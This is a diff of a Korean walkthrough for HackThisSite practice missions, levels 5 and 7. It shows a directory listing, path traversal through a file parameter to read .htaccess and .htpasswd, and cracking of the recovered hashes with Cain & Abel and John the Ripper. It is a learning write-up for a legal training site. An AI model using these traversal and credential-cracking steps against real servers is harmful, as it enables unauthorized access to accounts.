@@ -126,7 +126,9 @@ Bobby@friends.com
 - database 탭 확인
 
 소스보기 하면 `<form action="secret/admin.php">` 와 같은 경로가 보여 브라우저에서 접속해보았다.  `http://www.hackthissite.org/missions/realistic/5/secret/admin.php` 
-`Invalid Password`라고 메시지나 나왔다. 다시 브라우저에 `http://www.hackthissite.org/missions/realistic/5/secret/`을 입력해보니 다음과 같이 파일 디렉토리 리스트가 보이는 페이지가 나왔다.
+`Invalid Password`라고 메시지나 나왔다. 
+
+다시 브라우저에 `http://www.hackthissite.org/missions/realistic/5/secret/`을 입력해보니 다음과 같이 파일 디렉토리 리스트가 보이는 페이지가 나왔다.
 ```
 Index of /missions/realistic/5/secret
 - Parent Directory
@@ -134,9 +136,7 @@ Index of /missions/realistic/5/secret
 - admin.php
 ```
 admin.bak.php 파일을 클릭해보니 `error matching hash 7c5cbbedf29ebc07566cf09dadddb8d2`라는 메시지가 출력되었다.
-
-hash로 암호화되어있는 파일을 해독하기 위해 [***cain & abel***](https://en.wikipedia.org/wiki/Cain_and_Abel_(software))이라는프로그램 사용하였다. 
-
+hash로 암호화되어있는 파일을 해독하기 위해 [***cain & abel***](https://en.wikipedia.org/wiki/Cain_and_Abel_(software))  이라는프로그램 사용하였는데, 사용 방법은 다음과 같다. 
 소프트웨어를 설치하고 cracker-MD4 Hashes에 add to list에 hash string을 넣고 bruteforce하면 해독된 값이 나온다.
 
 - 결과값으로 나온 `05e04` 를 [database](https://www.hackthissite.org/missions/realistic/5/submit.html)의 패스워드 입력창에 넣으면 클리어!
@@ -146,12 +146,61 @@ hash로 암호화되어있는 파일을 해독하기 위해 [***cain & abel***](
 
 ## Level 7. What's Right For America
 ### 문제해결
-- `http://www.hackthissite.org/missions/realistic/7/images/` 에서 보면 파일 목록 볼 수 있고, admin계정이 하위디렉토리로 있음
+http://www.hackthissite.org/missions/realistic/7/images/ 에서 보면 파일 목록 볼 수 있고, admin directory가 리스트에 보인다. 리스트에서 admin을 클릭하여 http://www.hackthissite.org/missions/realistic/7/images/admin 에 접속하려고 하니 사용자 이름과 비밀번호를 입력하라고 한다. 여기에 접속하는 것이 관건인 듯...
 
-http://www.hackthissite.org/missions/realistic/7/images/admin 여기에 접속하는 것이 관건인 듯... 이미지 파일 불러올 때 아래와 같이 불러옴.. 여기서 취약점 존재하는듯..http://www.hackthissite.org/missions/realistic/7/showimages.php?file=patriot.txt http://www.hackthissite.org/missions/realistic/7/images/admin/ 이 뒤에 .htpasswd, .htaccess하면 사이트가 없다고 나오나, htpasswd, htaccess하면 인증하라고 함. 이미지 불러올 때 했던 것 처럼 php파일뒤에 get방식으로 불러와보자.http://www.hackthissite.org/missions/realistic/7/showimages.php?file=images/admin/.htpasswd
-http://www.hackthissite.org/missions/realistic/7/showimages.php?file=images/admin/.htaccess
-.pass보면 아래와 같은 코드 나옴.
-administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1 카인&아벨로는 안깨짐. 칼리리눅스에 있는 john the ripper로 크랙. level7.pass파일에 위 코드를 넣고 john level7.pass 하면 아래와 같이 메시지 나오면서 크랙됨. Loaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 12x]) shadow           (administrator) guesses: 1  time: 0:00:00:00 DONE (Wed Nov  5 16:09:07 2014)  c/s: 2500  trying: 123456 - diamond Use the "--show" option to display all of the cracked passwords reliably /images/admin에 아래 코드를 넣으면 풀림. administrator/shadow  
+이미지 파일 불러올 때 아래와 같이 불러온다.
+```text
+http://www.hackthissite.org/missions/realistic/7/showimages.php?file=patriot.txt
+```
+여기에 취약점 존재하는 것 같다...
+
+혹시모르니 설정파일을 찾아보기로 하였다.
+- http://www.hackthissite.org/missions/realistic/7/images/admin/.htaccess
+```
+Page Not Found
+The requested URL /missions/realistic/7/images/admin/.htaccess was not found on this server.
+```
+
+- http://www.hackthissite.org/missions/realistic/7/images/admin/.htpasswd
+```
+Page Not Found
+The requested URL /missions/realistic/7/images/admin/.htaccess was not found on this server.
+```
+
+page not found를 봤지만 포기하지 않고, 본 페이지에서 이미지를 불러오는 방식을 응용해보기로 했다. 이미지 불러올 때 했던 것 처럼 php파일뒤에 get방식으로 불러와보자.
+
+- http://www.hackthissite.org/missions/realistic/7/showimages.php?file=images/admin/.htaccess
+  + 뭔가 실마리가 보이는듯하다.
+```html
+<center><a href="AuthName "Administration Access"
+"><img src="AuthName "Administration Access"
+" width=100></a> <a href="AuthType Basic 
+"><img src="AuthType Basic 
+" width=100></a> <a href="AuthUserFile /www/hackthissite.org/www/missions/realistic/7/images/admin/.htpasswd
+"><img src="AuthUserFile /www/hackthissite.org/www/missions/realistic/7/images/admin/.htpasswd
+" width=100></a> <a href="require valid-user
+"><img src="require valid-user
+" width=100></a> <a href=""><img src="" width=100></a> </center></font>
+</td></tr></table>
+```
+
+- http://www.hackthissite.org/missions/realistic/7/showimages.php?file=images/admin/.htpasswd
+  + 거의 다 온 것 같다.
+	+ 소스코드보기로 확인
+
+```html
+<center><a href="administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1
+"><img src="administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1
+" width=100></a> <a href=""><img src="" width=100></a> </center></font>
+</td></tr></table>
+```
+  + `administrator:$1$AAODv...$gXPqGkIO3Cu6dnclE/sok1`를 이전 레벨에서와 같이 카인&아벨에 넣어보았으나 그걸로는 안깨졌다. 
+	+ 칼리리눅스에 있는 john the ripper로 크랙
+
+```
+Loaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 12x]) shadow(administrator) guesses: 1  time: 0:00:00:00 DONE (Wed Nov 5 16:09:07 2014) c/s: 2500  trying: 123456 - diamond Use the "--show" option to display all of the cracked passwords reliably
+```
+위와 같은 메시지가 나오면서 크랙이 완료된다. `/images/admin`에 아래 코드를 넣으면 클리어! ID: administrator, password: shadow
 
 ## Level 8. United Banks Of America
 ### 문제해결
